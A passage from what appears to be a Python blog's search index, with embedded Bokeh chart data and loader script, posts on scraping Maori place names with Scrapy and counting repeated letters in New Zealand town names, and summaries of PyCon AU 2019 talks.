Counts\"},\"id\":\"1004\",\"type\":\"Title\"},{\"attributes\":{},\"id\":\"1019\",\"type\":\"BasicTicker\"},{\"attributes\":{},\"id\":\"1049\",\"type\":\"Selection\"},{\"attributes\":{},\"id\":\"1028\",\"type\":\"HelpTool\"},{\"attributes\":{\"bottom_units\":\"screen\",\"fill_alpha\":{\"value\":0.5},\"fill_color\":{\"value\":\"lightgrey\"},\"left_units\":\"screen\",\"level\":\"overlay\",\"line_alpha\":{\"value\":1.0},\"line_color\":{\"value\":\"black\"},\"line_dash\":[4,4],\"line_width\":{\"value\":2},\"render_mode\":\"css\",\"right_units\":\"screen\",\"top_units\":\"screen\"},\"id\":\"1047\",\"type\":\"BoxAnnotation\"},{\"attributes\":{\"dimension\":1,\"ticker\":{\"id\":\"1019\",\"type\":\"BasicTicker\"}},\"id\":\"1022\",\"type\":\"Grid\"},{\"attributes\":{\"callback\":null,\"factors\":[\"A\",\"B\",\"C\",\"D\",\"E\",\"F\",\"G\",\"H\",\"I\",\"J\",\"K\",\"L\",\"M\",\"N\",\"O\",\"P\",\"Q\",\"R\",\"S\",\"T\",\"U\",\"V\",\"W\",\"X\",\"Y\",\"Z\"]},\"id\":\"1006\",\"type\":\"FactorRange\"},{\"attributes\":{\"active_drag\":\"auto\",\"active_inspect\":\"auto\",\"active_multi\":null,\"active_scroll\":\"auto\",\"active_tap\":\"auto\",\"tools\":[{\"id\":\"1023\",\"type\":\"PanTool\"},{\"id\":\"1024\",\"type\":\"WheelZoomTool\"},{\"id\":\"1025\",\"type\":\"BoxZoomTool\"},{\"id\":\"1026\",\"type\":\"SaveTool\"},{\"id\":\"1027\",\"type\":\"ResetTool\"},{\"id\":\"1028\",\"type\":\"HelpTool\"},{\"id\":\"1002\",\"type\":\"HoverTool\"}]},\"id\":\"1029\",\"type\":\"Toolbar\"},{\"attributes\":{\"fill_alpha\":{\"value\":0.1},\"fill_color\":{\"value\":\"#1f77b4\"},\"line_alpha\":{\"value\":0.1},\"line_color\":{\"value\":\"#1f77b4\"},\"top\":{\"field\":\"Count\"},\"width\":{\"value\":0.9},\"x\":{\"field\":\"index\"}},\"id\":\"1038\",\"type\":\"VBar\"},{\"attributes\":{\"below\":[{\"id\":\"1014\",\"type\":\"CategoricalAxis\"}],\"center\":[{\"id\":\"1017\",\"type\":\"Grid\"},{\"id\":\"1022\",\"type\":\"Grid\"}],\"left\":[{\"id\":\"1018\",\"type\":\"LinearAxis\"}],\"plot_height\":250,\"renderers\":[{\"id\":\"1039\",\"type\":\"GlyphRenderer\"}],\"title\":{\"id\":\"1004\",\"type\":\"Title\"},\"toolbar\":{\"id\":\"1029\",\"type\":\"Toolbar\"},\"toolbar_location\":null,\"x_range\":{\"id\":\"1006\",\"type\":\"FactorRange\"},\"x_scale\":{\"id\":\"1010\",\"type\":\"CategoricalScale\"},\"y_range\":{\"id\":\"1008\",\"type\":\"DataRange1d\"},\"y_scale\":{\"id\":\"1012\",\"type\":\"LinearScale\"}},\"id\":\"1003\",\"subtype\":\"Figure\",\"type\":\"Plot\"},{\"attributes\":{\"callback\":null,\"start\":0},\"id\":\"1008\",\"type\":\"DataRange1d\"}],\"root_ids\":[\"1003\"]},\"title\":\"Bokeh Application\",\"version\":\"1.3.1\"}} (function() { var fn = function() { Bokeh.safely(function() { (function(root) { function embed_document(root) { var docs_json = document.getElementById('1114').textContent; var render_items = [{\"docid\":\"6a79ccec-7604-45e6-8eef-74d2887334ba\",\"roots\":{\"1003\":\"44d6f2ea-a84c-406e-98f4-090d20f0aa6f\"}}]; root.Bokeh.embed.embed_items(docs_json, render_items); } if (root.Bokeh !== undefined) { embed_document(root); } else { var attempts = 0; var timer = setInterval(function(root) { if (root.Bokeh !== undefined) { embed_document(root); clearInterval(timer); } attempts++; if (attempts > 100) { console.log(\"Bokeh: ERROR: Unable to run BokehJS code because BokehJS library is missing\"); clearInterval(timer); } }, 10, root) } })(window); }); }; if (document.readyState != \"loading\") fn(); else document.addEventListener(\"DOMContentLoaded\", fn); })(); Similarly with most of my posts of this nature, we always begin by getting the data. To find a data set that gives us as many Maori town or place names as possible proved to be quite challenging, but luckily for Maori Language week NZhistory.gov.nz posted a table of a 1000 Maori place names, their components and the meaning. This data can be found: https://nzhistory.govt.nz/culture/maori-language-week/1000-maori-place-names . Unlike last time however with our world city names from Kaggle , this data isn't nicely supplied to us in an Excel format. While it may be possible to directly copy-paste from the website into a spreadsheet, I think this is a great way to ease into web scraping. What is Web Scraping Web scraping, web harvesting or web data extraction is the process of extracting data from websites. To do this in Python, while there is multiple ways to achieve this (requests + beautiful soup, selenium, etc), my personal favourite package to use is Scrapy . While it may be daunting to begin with from a non object-oriented basis, you will soon appreciate it more once you've begun using it. Initially the premise around the Scrapy package is to create 'web spiders'. If we take a look of the structure of the first example on the Scrapy website we get an understanding on how to structure our web spiders when developing: 1 2 3 4 5 6 7 8 9 10 11 import scrapy class BlogSpider ( scrapy . Spider ): name = 'blogspider' start_urls = [ 'https://blog.scrapinghub.com' ] def parse ( self , response ): for title in response . css ( '.post-header>h2' ): yield { 'title' : title . css ( 'a ::text' ) . get ()} for next_page in response . css ( 'a.next-posts-link' ): yield response . follow ( next_page , self . parse ) First of all we can see that the custom spider is essentially an extension of the scrapy.Spider class. It is to be noted that the name and start_urls variables (which are apart of the class) are special in the sense the scrapy package uses them as configuration settings. When it comes to web scraping, if you have had experience using HTML, CSS and/or Javascript, this experience will become extremely useful; that is not to say it is not possible without experience, it's just a learning curve. Following on we can see a function for parsing (also specially named) in which there are 2 loops, the first for loop is going to loop through all title's marked as headers (specifically h2) and return a dictionary with the text in the heading. 1 2 3 4 5 6 7 8 9 10 11 12 13 14 class NameSpider ( scrapy . Spider ): name = 'names' start_urls = [ 'https://nzhistory.govt.nz/culture/maori-language-week/1000-maori-place-names/' ] def parse ( self , response ): def extract_from_table ( table_row , table_col ): return response . xpath ( f \"//tr[ { table_row } ]//td[ { table_col } ]//text()\" ) . get () for i in range ( 2 , 1000 ): yield { 'Place Name' : extract_from_table ( i , 1 ), 'Components' : extract_from_table ( i , 2 ), 'Meaning' : extract_from_table ( i , 3 ) } Now that we have created our spider that looks through each row of the table on the webpage (more information on determining this can be found: https://docs.scrapy.org/en/latest/intro/tutorial.html ). It's time to run the spider and take a look at the output. To run a spider you go into the directory from the command line and run 'scrapy crawl \\<spider name>' and to store an output at the same time 'scrapy crawl \\<spider name> -o filename.csv -t csv. Now similar to the previous post, we run a similar analysis and plot with Bokeh! 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 32 33 34 35 36 37 38 39 40 41 42 43 44 45 46 47 48 49 50 51 52 53 54 55 56 57 import pandas as pd import collections from collections import OrderedDict import operator import matplotlib.pyplot as plt import numpy as np import math from bokeh.io import show , output_file from bokeh.plotting import figure from bokeh.models import ColumnDataSource from bokeh.models.tools import HoverTool names_df = pd . read_csv ( 'names.csv' , header = 0 , sep = ',' , quotechar = '\"' ) nz_names = names_df [ 'Place Name' ] . tolist () nz_dict = { i : 0 for i in nz_names } letters = 'ABCDEFGHIJKLMNOPQRSTUVWXYZ' lcount = dict ( OrderedDict ([( l , 0 ) for l in letters ])) for name in nz_names : nz_dict [ name ] = dict ( OrderedDict ([( l , 0 ) for l in letters ])) city_dict = nz_dict [ name ] for c in name : if c . upper () in letters : city_dict [ c . upper ()] += 1 total_df = pd . DataFrame . from_dict ( nz_dict ) total_df = total_df . T max_letters_cities = total_df . idxmax () . tolist () lettercounts = total_df . loc [ total_df . idxmax ()] . max () . tolist () maxletters = dict ( OrderedDict ([( l , 0 ) for l in letters ])) for i , l in enumerate ( letters ): maxletters [ l ] = max_letters_cities [ i ] maxletters [ l ] = ( lettercounts [ i ]) summary_df = pd . DataFrame () scale = 1 summary_df [ 'Word_Name' ] = total_df . idxmax () summary_df [ 'Count' ] = total_df . loc [ total_df . idxmax ()] . max () source = ColumnDataSource ( summary_df ) output_file ( \"letter_count.html\" ) hover = HoverTool () hover . tooltips = [ ( 'Word' , '@Word' ) ] p = figure ( x_range = summary_df . index . tolist (), plot_height = 250 , title = \"Letter Counts\" , toolbar_location = None ) p . vbar ( x = 'index' , top = 'Count' , width = 0.9 , source = source ) p . add_tools ( hover ) p . xgrid . grid_line_color = None p . y_range . start = 0 show ( p )","tags":"Python","url":"https://jackmckew.dev/intro-to-web-scraping.html","loc":"https://jackmckew.dev/intro-to-web-scraping.html"},{"title":"Looking for Patterns in City Names & Interactive Plotting","text":"Recently, I was traveling around New Zealand, and noticed in the Maori language they use letters back to back a lot like in the original Maori name for Stratford (\"whakaahurangi\"). So as any normal person does, I thought, well what town has the most repeated letters, and the idea for this blog post was born. Before we get into the nitty gritty, here is the output of the analysis! In [28]: # output_file(\"NZ_City_Letter_Analysis.html\") # save(p) html = file_html ( p , CDN , \"NZ_City_Letter_Analysis\" ) from IPython.core.display import HTML HTML ( html ) Out[28]: NZ_City_Letter_Analysis Bokeh.set_log_level(\"info\"); {\"9a7c834e-4561-48ee-a338-ba00b9647999\":{\"roots\":{\"references\":[{\"attributes\":{\"dimension\":1,\"ticker\":{\"id\":\"1211\",\"type\":\"MercatorTicker\"}},\"id\":\"1218\",\"type\":\"Grid\"},{\"attributes\":{},\"id\":\"1197\",\"type\":\"LinearScale\"},{\"attributes\":{\"attribution\":\"&amp;copy; &lt;a href=\\\"https://www.openstreetmap.org/copyright\\\"&gt;OpenStreetMap&lt;/a&gt; contributors,&amp;copy; &lt;a href=\\\"https://cartodb.com/attributions\\\"&gt;CartoDB&lt;/a&gt;\",\"url\":\"https://tiles.basemaps.cartocdn.com/light_all/{z}/{x}/{y}.png\"},\"id\":\"1189\",\"type\":\"WMTSTileSource\"},{\"attributes\":{\"text\":\"\"},\"id\":\"1232\",\"type\":\"Title\"},{\"attributes\":{\"callback\":null,\"end\":-4000000,\"start\":-6000000},\"id\":\"1195\",\"type\":\"Range1d\"},{\"attributes\":{\"callback\":null,\"tooltips\":[[\"Repeated Letter\",\"@letters\"],[\"City Name\",\"@city_name\"],[\"Count\",\"@lettercount\"]]},\"id\":\"1191\",\"type\":\"HoverTool\"},{\"attributes\":{\"callback\":null,\"end\":17900000,\"start\":20000000},\"id\":\"1193\",\"type\":\"Range1d\"},{\"attributes\":{},\"id\":\"1199\",\"type\":\"LinearScale\"},{\"attributes\":{\"below\":[{\"id\":\"1201\",\"type\":\"MercatorAxis\"}],\"center\":[{\"id\":\"1209\",\"type\":\"Grid\"},{\"id\":\"1218\",\"type\":\"Grid\"}],\"left\":[{\"id\":\"1210\",\"type\":\"MercatorAxis\"}],\"renderers\":[{\"id\":\"1225\",\"type\":\"TileRenderer\"},{\"id\":\"1230\",\"type\":\"GlyphRenderer\"}],\"title\":{\"id\":\"1232\",\"type\":\"Title\"},\"toolbar\":{\"id\":\"1221\",\"type\":\"Toolbar\"},\"x_range\":{\"id\":\"1193\",\"type\":\"Range1d\"},\"x_scale\":{\"id\":\"1197\",\"type\":\"LinearScale\"},\"y_range\":{\"id\":\"1195\",\"type\":\"Range1d\"},\"y_scale\":{\"id\":\"1199\",\"type\":\"LinearScale\"}},\"id\":\"1192\",\"subtype\":\"Figure\",\"type\":\"Plot\"},{\"attributes\":{},\"id\":\"1219\",\"type\":\"WheelZoomTool\"},{\"attributes\":{\"dimension\":\"lon\"},\"id\":\"1202\",\"type\":\"MercatorTicker\"},{\"attributes\":{\"source\":{\"id\":\"1190\",\"type\":\"ColumnDataSource\"}},\"id\":\"1231\",\"type\":\"CDSView\"},{\"attributes\":{\"dimension\":\"lat\"},\"id\":\"1211\",\"type\":\"MercatorTicker\"},{\"attributes\":{\"tile_source\":{\"id\":\"1189\",\"type\":\"WMTSTileSource\"}},\"id\":\"1225\",\"type\":\"TileRenderer\"},{\"attributes\":{\"data_source\":{\"id\":\"1190\",\"type\":\"ColumnDataSource\"},\"glyph\":{\"id\":\"1228\",\"type\":\"Circle\"},\"hover_glyph\":null,\"muted_glyph\":null,\"nonselection_glyph\":{\"id\":\"1229\",\"type\":\"Circle\"},\"selection_glyph\":null,\"view\":{\"id\":\"1231\",\"type\":\"CDSView\"}},\"id\":\"1230\",\"type\":\"GlyphRenderer\"},{\"attributes\":{\"dimension\":\"lon\"},\"id\":\"1204\",\"type\":\"MercatorTickFormatter\"},{\"attributes\":{\"callback\":null,\"data\":{\"city_name\":[\"Kaingapai Hakataramea Station\",\"Abbotsford\",\"Christchurch\",\"Edendale Town District\",\"Earnscleugh Settlement\",\"Flagstaff\",\"Kyeburn Diggings\",\"Christchurch\",\"Kihikihi Town District\",\"Clarks Junction\",\"Kokakoriki\",\"Bell Hill\",\"Benmore Stream\",\"Frankton Junction\",\"Goodwood\",\"Upper Papamoa\",\"Quarry Hills\",\"Sherry River\",\"Simons Pass\",\"Otautau Town District\",\"Murumuru\",\"Five Rivers\",\"Kawakawa Town District\",\"Bexley\",\"Admiralty Bay\",\"Fitzroy\"],\"latitude\":[-5558767.960998884,-5761672.922065697,-5393506.130539223,-5831241.362079489,-5655696.009663975,-5753680.824788744,-5621521.486192067,-5393506.130539223,-4584135.718572788,-5737718.1425425,-4726447.364137138,-5243726.168310261,-5519766.216040407,-4551210.9196918905,-5708527.338604558,-4546515.922191398,-5868929.46316788,-5076469.831602914,-5496444.98987784,-5804419.495079225,-4759941.634140226,-5719131.201735792,-4216097.3615601715,-5365398.062254726,-5004969.470230386,-4728836.17627514],\"lettercount\":[9,2,3,3,5,3,3,3,6,1,4,4,2,4,4,4,1,4,4,5,4,2,3,1,2,1],\"letters\":[\"A\",\"B\",\"C\",\"D\",\"E\",\"F\",\"G\",\"H\",\"I\",\"J\",\"K\",\"L\",\"M\",\"N\",\"O\",\"P\",\"Q\",\"R\",\"S\",\"T\",\"U\",\"V\",\"W\",\"X\",\"Y\",\"Z\"],\"longitude\":[18987394.516745858,18970696.593126863,19217454.72350563,18788874.683951527,18848245.15325427,18978117.8183001,18955853.92014144,19217454.72350563,19519872.710600525,18929879.40939617,19493898.19985525,19102424.620125744,18924313.434856508,19510596.12347424,19004092.44036485,19620060.252314463,18816704.556649845,19228586.67258496,18955853.92014144,18701674.453269962,19495753.45048881,18751768.224126928,19377012.734522317,19154373.75293577,19360314.810903326,19380723.34710893],\"sizes\":[27,6,9,9,15,9,9,9,18,3,12,12,6,12,12,12,3,12,12,15,12,6,9,3,6,3]},\"selected\":{\"id\":\"1238\",\"type\":\"Selection\"},\"selection_policy\":{\"id\":\"1239\",\"type\":\"UnionRenderers\"}},\"id\":\"1190\",\"type\":\"ColumnDataSource\"},{\"attributes\":{\"fill_alpha\":{\"value\":0.1},\"fill_color\":{\"value\":\"#1f77b4\"},\"line_alpha\":{\"value\":0.1},\"line_color\":{\"value\":\"#1f77b4\"},\"size\":{\"field\":\"sizes\",\"units\":\"screen\"},\"x\":{\"field\":\"longitude\"},\"y\":{\"field\":\"latitude\"}},\"id\":\"1229\",\"type\":\"Circle\"},{\"attributes\":{\"formatter\":{\"id\":\"1213\",\"type\":\"MercatorTickFormatter\"},\"ticker\":{\"id\":\"1211\",\"type\":\"MercatorTicker\"}},\"id\":\"1210\",\"type\":\"MercatorAxis\"},{\"attributes\":{},\"id\":\"1220\",\"type\":\"SaveTool\"},{\"attributes\":{},\"id\":\"1238\",\"type\":\"Selection\"},{\"attributes\":{\"dimension\":\"lat\"},\"id\":\"1213\",\"type\":\"MercatorTickFormatter\"},{\"attributes\":{},\"id\":\"1239\",\"type\":\"UnionRenderers\"},{\"attributes\":{\"ticker\":{\"id\":\"1202\",\"type\":\"MercatorTicker\"}},\"id\":\"1209\",\"type\":\"Grid\"},{\"attributes\":{\"fill_alpha\":{\"value\":0.05},\"fill_color\":{\"value\":\"#FF0000\"},\"line_color\":{\"value\":\"#FF0000\"},\"size\":{\"field\":\"sizes\",\"units\":\"screen\"},\"x\":{\"field\":\"longitude\"},\"y\":{\"field\":\"latitude\"}},\"id\":\"1228\",\"type\":\"Circle\"},{\"attributes\":{\"active_drag\":\"auto\",\"active_inspect\":\"auto\",\"active_multi\":null,\"active_scroll\":\"auto\",\"active_tap\":\"auto\",\"tools\":[{\"id\":\"1191\",\"type\":\"HoverTool\"},{\"id\":\"1219\",\"type\":\"WheelZoomTool\"},{\"id\":\"1220\",\"type\":\"SaveTool\"}]},\"id\":\"1221\",\"type\":\"Toolbar\"},{\"attributes\":{\"formatter\":{\"id\":\"1204\",\"type\":\"MercatorTickFormatter\"},\"ticker\":{\"id\":\"1202\",\"type\":\"MercatorTicker\"}},\"id\":\"1201\",\"type\":\"MercatorAxis\"}],\"root_ids\":[\"1192\"]},\"title\":\"Bokeh Application\",\"version\":\"1.3.1\"}} (function() { var fn = function() { Bokeh.safely(function() { (function(root) { function embed_document(root) { var docs_json = document.getElementById('1434').textContent; var render_items = [{\"docid\":\"9a7c834e-4561-48ee-a338-ba00b9647999\",\"roots\":{\"1192\":\"58e3361f-8aef-4cf7-8d23-0a232c72c24b\"}}]; root.Bokeh.embed.embed_items(docs_json, render_items); } if (root.Bokeh !== undefined) { embed_document(root); } else { var attempts = 0; var timer = setInterval(function(root) { if (root.Bokeh !== undefined) { embed_document(root); clearInterval(timer); } attempts++; if (attempts > 100) { console.log(\"Bokeh: ERROR: Unable to run BokehJS code because BokehJS library is missing\"); clearInterval(timer); } }, 10, root) } })(window); }); }; if (document.readyState != \"loading\") fn(); else document.addEventListener(\"DOMContentLoaded\", fn); })(); Firstly, we have to find a dataset of all the town names, and I found a database of all world cities names hosted on Kaggle here: https://www.kaggle.com/max-mind/world-cities-database . Get the data! 1 2 3 # data source https://www.kaggle.com/max-mind/world-cities-database cities_df = pd . read_csv ( './data/worldcitiespop.csv' , header = 0 , sep = ',' , quotechar = '\"' ) cities_df = cities_df [ cities_df [ 'Country' ] == \"nz\" ] After inspecting the data of this data set, we're able to filter out to look at just New Zealand with the prefix of \"nz\" in the Country column. It must be noted that this data set represents the names of the towns currently, and not the original Maori names (more on this will be covered in a later post). Now we want to extract the town names out of the dataframe with the ones we want to analyze. For ease later on, we will extract this as a dictionary, such that we can assign the value of each to the count of each letter. 1 2 nz_cities = cities_df [ cities_df [ 'Country' ] == \"nz\" ][ 'AccentCity' ] . tolist () nz_dict = { i : 0 for i in nz_cities } Now we will create an ordered dictionary with the help from the collections package which will store the values of the count for each letter in the town name. 1 2 letters = 'ABCDEFGHIJKLMNOPQRSTUVWXYZ' lcount = dict ( OrderedDict ([( l , 0 ) for l in letters ])) Now it's time for the data crunch. To count how many times a letter repeats in a town name we follow these steps: we create a for loop, to loop through all the city names in the table, initialise an ordered dictionary similar to above for each city in the value field of that town's dictionary entry loop through each letter in the town name check if the letter appears in our letter dictionary (mainly to not count spaces), Then if the letter does appear, increment the value for that letter by 1. This results in a dictionary for each town name, with the count of repeated letters. 1 2 3 4 5 6 for city in nz_cities : nz_dict [ city ] = dict ( OrderedDict ([( l , 0 ) for l in letters ])) city_dict = nz_dict [ city ] for c in city : if c . upper () in letters : city_dict [ c . upper ()] += 1 Hooray! Now we have all the data we need broken down and ready for analysis. To help ease the analysis and make it more readable for a human, we convert from our nested dictionaries to a pandas dataframe and transpose it such that we have the town name as the index, the letters as the column and the count of that letter as the values. 1 2 total_df = pd . DataFrame . from_dict ( nz_dict ) total_df = total_df . T Now we want to find which of these names have the maximum count for any particular letter and store it in a summary dataframe. It is to be noted that we could use the pivot function with aggregate types, however, I have not figured a nice way to do this yet. If you do know a nicer way to determine this, please let me know. 1 2 3 4 summary_df = pd . DataFrame () scale = 1 summary_df [ 'City_Name' ] = total_df . idxmax () summary_df [ 'Count' ] = total_df . loc [ total_df . idxmax ()] . max () Now by using the equivalent of an index-match in excel which you can read more about here ( https://towardsdatascience.com/name-your-favorite-excel-function-and-ill-teach-you-its-pandas-equivalent-7ee4400ada9f ). Admittedly, we could've made the join earlier, but since I use index-match so often in Excel, I wanted to learn how to do the same in pandas. This is achieved by using the map function (which is the equivalent of the index), but by using the index of another dataframe as the argument (the match function), we can rejoin the data set by matching the city name from our original data set. 1 2 summary_df [ 'Latitude' ] = summary_df [ 'City_Name' ] . map ( cities_df . set_index ([ 'AccentCity' ])[ 'Latitude' ] . to_dict ()) * scale summary_df [ 'Longitude' ] = summary_df [ 'City_Name' ] . map ( cities_df . set_index ([ 'AccentCity' ])[ 'Longitude' ] . to_dict ()) * scale Now we have a dataframe that contains: an index of the letters, the town name with the most repeated letters, the count of the letters within the name, the longitude and latitude of the town For plotting with Bokeh on a basemap, we need to convert from longitude & latitude to easting and northing. To do this we use the pyproj package to make this very simple. 1 2 3 4 5 6 7 def LongLat_to_EN ( long , lat ): try : easting , northing = transform ( Proj ( init = 'epsg:4326' ), Proj ( init = 'epsg:3857' ), long , lat ) return easting , northing except : return None , None This function can be used to generate the easting and northing for every town from it's longitude & latitude and add it to the dataframe. 1 summary_df [ 'E' ], summary_df [ 'N' ] = zip ( * summary_df . apply ( lambda x : LongLat_to_EN ( x [ 'Longitude' ], x [ 'Latitude' ]), axis = 1 )) Finally, it's time to plot our findings on a map. Before we initialise the map in Bokeh , for most plots, data tables and more in Bokeh , we need to put it in the ColumnDataSource form. We also initialise the interactivity when the user hovers over the data points on the plot. 1 2 3 4 5 6 7 8 9 10 11 12 13 14 source = ColumnDataSource ( data = dict ( longitude = list ( summary_df [ 'E' ]), latitude = list ( summary_df [ 'N' ]), sizes = list ( summary_df [ 'Count' ] * 3 ), lettercount = list ( summary_df [ 'Count' ]), city_name = list ( summary_df [ 'City_Name' ]), letters = list ( summary_df . index ))) hover = HoverTool ( tooltips = [ ( \"Repeated Letter\" , \"@letters\" ), ( \"City Name\" , \"@city_name\" ), ( \"Count\" , \"@lettercount\" ) ]) Finally time for the plot! Now admittedly, I haven't found an easy way to find the limits of the graph, so this was made with a lot of trial and error (If you know a better way, please let me know!). 1 2 3 4 5 6 7 8 9 p = figure ( x_range = ( 20000000 , 17900000 ), y_range = ( - 6000000 , - 4000000 ), x_axis_type = \"mercator\" , y_axis_type = \"mercator\" , tools = [ hover , 'wheel_zoom' , 'save' ]) p . add_tile ( CARTODBPOSITRON ) p . circle ( x = 'longitude' , y = 'latitude' , size = 'sizes' , source = source , line_color = \"#FF0000\" , fill_color = \"#FF0000\" , fill_alpha = 0.05 )","tags":"Python","url":"https://jackmckew.dev/looking-for-patterns-in-city-names-interactive-plotting.html","loc":"https://jackmckew.dev/looking-for-patterns-in-city-names-interactive-plotting.html"},{"title":"PyCon AU 2019 Sunday In Summary","text":"This is a follow on from my last post PyCon AU 2019 Saturday In Summary . Day 2 The real costs of Open Source Sustainability \\@vmbrasseur The key takeaway that I got from this talk, was the typical reaction for problems which are far away from yourself or out of your control is to donate money. Vicky spoke about how sometimes money is not the solution to problems, specifically, for open source projects. Ways you can contribute can be summed up using the term Time, Talent, Treasure. Time: you can donate your time to help a cause, Talent: you can donate your skills and talents, Treasure: you can donate your treasures. Shipping your first Python package and automating future publishing \\@chriswilcox47 Packaging has always been a bit of enigma to me, and Chris Wilcox did an excellent job at explaining not only the structure behind a package, but also how to ship a package. One thing that I have noticed to make sure is to ensure your project structure is in place, and cookie cutter helps with this. Tox & Nox can be used to automate testing of your package over multiple versions and distributions of Python, so you can reassure your users that the package will work no matter the environment. It's dark and my lights aren't working (an asyncio success story) \\@jim_mussared This was one of the talks that really resonated with my previous experience in my thesis project working with the ESP8266. Jim gave a very funny and relatable talk on the experience of using Zigbee communications to link the lights in a new home. The universe as balls and springs: molecular dynamics in Python \\@lilyminium Jupyter notebooks can not only be used for developing, but also as presentations. Lily gave an in-depth talk about the analysis of molecular dynamics, presenting from a jupyter notebook which showed off the power of interactive visualizations making a very complex topic, simple and easy to understand. \"Git hook[ed]\" on images & up your documentation game \\@veronica_hanus As another person that appreciates visual cues to what changes were made in the past, I can definitely see why using Pyppeteer to hook a screenshot onto a git commit can make a massive difference on going back to the commit history and be able to see exactly what changes were made. Sunday Lightning Talks Personally, I really appreciated the talk on https://www.growstuff.org/ , a self proclaimed 'Tinder for Potatos'. Where users can put their plants they are growing & get a progress bar! Then they can interact with other growers, so possibly exchange and grow both the community and the plants. https://youtu.be/q2VmIUaOS9o?t=9 A few of the lightning talks really demonstrated how welcoming the Python & software community is. From Fashion at PyConAU 2019 showing how people can be their true self around a welcoming community to learning what it is like to be Jewish at a conference . To quote \\@UrcherAus , \"And can come out, presenting as female in public for the very first time, and we say to you, â€˜welcome to #pyconau , I love your outfit'\". All the great ideas people gave me Learning that Google has a monolithic \"Monorepo\", where they store all of their projects in one repository to alleviate the problems of maintaining multiple repositories for varying projects that all depend on each other. Finding out that Blender has native support for Python scripting, and produces amazing renders. Very much so looking forward to finding some time to try out Blender and see if I can integrate Python and Blender. Watch this space for a future post on this topic! My to-do list after Pycon Day 2 ~~Write this blog post!~~ (Day 1), Look into tilemill (Day 1), ~~Understand~~ ~~mutable and immutable~~ ~~better (Day 1),~~ ~~Learn what~~ ~~super does in Python~~ ~~(Day 1),~~ Try make some generative art (Day 1), Looking into papermill + jupyterlab (Day 1), Have a go at using XGBoost and text (Day 1), Get (much) better at testing with pytest (Day 1), ~~Look into structuring python projects better~~ (Day 1), Move this website to static html with netlify and more (Day 1), ~~Look into~~ ~~singularity~~ ~~(Day 1),~~ ~~Look into~~ ~~GitFlow Workflow~~ ~~(Day 1),~~ Have a go at using Blender (Day 2), Try make and give a presentation with Jupyter (Day 2), Try making a plot in Plotly (Day 2), Look into Binder for distributing code (Day 2), Listen to Python Bytes podcasts (Day 2). Talks to catch up on \"Extracting tabular data from PDFs with Camelot & Excalibur\" - Vinayak Mehta , \"Using Dash by Plotly for Interactive Visualisation of Crime Data\" - Leo Broska , \"Using Python, Flask and Docker To Teach Web Pentesting\" - Zain Afzal, Carey Li , \"cuDF: RAPIDS GPU-Accelerated Dataframe Library\" - Mark Harris , \"3D Rendering with Python\" - Andrew Williams , Machine Learning and Cyber Security - Detecting malicious URLs in the haystack , Tunnel Snakes Rule! Bringing the many worlds of Python together , \"Goodbye Print Statements, Hello Debugger!\" - Nina Zakharenko , \"Insights into Social Media Data using Entropy Theory\" - Mars Geldard .","tags":"Python","url":"https://jackmckew.dev/pycon-au-2019-sunday-in-summary.html","loc":"https://jackmckew.dev/pycon-au-2019-sunday-in-summary.html"},{"title":"PyCon AU 2019 Saturday In Summary","text":"My first ever conference, learning things I'd never even think of, meeting lots of new people and making my to-do list full of new things to learn. All this happened over the weekend at PyConAU 2019 . This post is dedicated to all the fantastic people I met that gave me new perspectives on python programming and all the amazing talks I had the pleasure of attending. Please note that all the talks written about here were only the ones I was able to attend, there were many other amazing talks that I didn't get the opportunity to go to (will list the follow up ones later in the post) and would recommend to go through the youtube playlist of all the talks found here: https://www.youtube.com/user/PyConAU . A link to all the talks and descriptions can also be found in the headings. To make this post more digestible for the reader (you!), I have broken into parts which are linked here: Day 1 - How to communicate with businesses, metaclasses in python, making generative art, python applications in engineering, refactoring a large scale OSS project and the antipodean approach; Day 1 - Lightning talks; All the great ideas people gave me; My further to-do list following day 1. Day 1 Creating Lasting Change \\@aurynn Day 1 kicked off with a keynote talk from aurynn , who spoke about the lessons learned from talking to your boss. My personal key takeaways were: One word slides directs your focus to the talk rather than distracting, Communicating with people outside your discipline, interest area, etc is made much easier if you put whatever the topic is from their perspective, particularly in the workplace, putting things in terms of risk as this is what matters to businesses. It's Pythons All The Way Down: Python Types & Metaclasses Made Simple \\@judy2k Now classes are admittedly one of my weak points, so what better to do then go straight to metaclasses! My personal key takeaways were: If you run dir() on a type, it'll tell you all the capabilities of that type (eg, dir(int) returns [...,'__add__',...]); Complex numbers and functions have their own type in python; Descriptors override attribute access; There are two types of descriptors (data and non-data) where data descriptors are mutators; Metaclasses can be used as blueprints for generating classes; You can ensure classes are made appropriately with metaclasses. Pretty vector graphics - Playing with SVG in Python Amanda J Hogan By feeding strings of text (which are instructions), you can generate graphics with SVG, mix this with loops and you get generative art! Art being generally a very visual process, watch the video to get a better understanding, personally I liked this one: Python Applications in Infrastructure Planning and Civil Engineering Ben Chu As someone that works for a large engineering firm, this talk resonated with the possibilities of using python to automate jobs and get better results. Firstly, Ben spoke about using Jupyter notebooks to make interactive reports for the environmental teams to utilise for their analysis and using papermill to export these into different formats (excel, pdf, etc). Ben also used python to automate the verification stages of a proposed rail corridor location. By using requests & beautiful soup to scrape the NSW development application website along with a machine learning classification algorithm ( XGBoost ) for the developments impact on the rail corridor. Finally plotting this on an interactive map for the rail designers to use. How I auto-refactored a huge OSS project to use pytest \\@craigds2 Craig gave a great talk about how he used PyBowler, Pytest and importantly pytest-sugar to automatically refactor existing testing framework for a huge open source project GDAL . This post has inspired me to do more testing & refactoring on my code as I develop things! The Antipodes \\@brandon_rhodes Personally this talk really resonated with a habit that I have been trying to employ in my life recently. The basic principle being behind the meaning of the idea of antipodean s, someone standing on the exact other side of the planet from you. I thought this was an amazing segway for moving to a new framework for structuring communications. As most of us do, whenever replying to communication from someone, we normally start with me, me, me, me, you. For example, if someone asked us to make a decision, typically & personally, I would start the reply with stating why I had got to the decision, finally ending the message with the decision and the next steps. A technique that I have recently started employing on my messaging is writing as I normally would and before hitting send, moving what matters most to the reader (the decision) to the top, followed by next steps and then going through all the reasons why I possibly had made that decision. Saturday Lightning Talks Personally, I thought the most interesting lightning talk was about procedurally generating planets, modelling them in 3D and then trying to estimate if the climate on them https://youtu.be/AJqcxEzRdSY?t=140 . What I think was the crowd favourite, was the History and Politics of Australian supermarkets and their mergers . Definitely worth the watch. All the great ideas people gave me Shoutout to \\@davidjb_ who made me aware of modern static html sites with using Pelican and Netlify . By using a repository to store all the content, you can use these tools in combination to make an automated workflow for a CMS (Content management system) for deploying a website. Will definitely be looking into this for this very website! 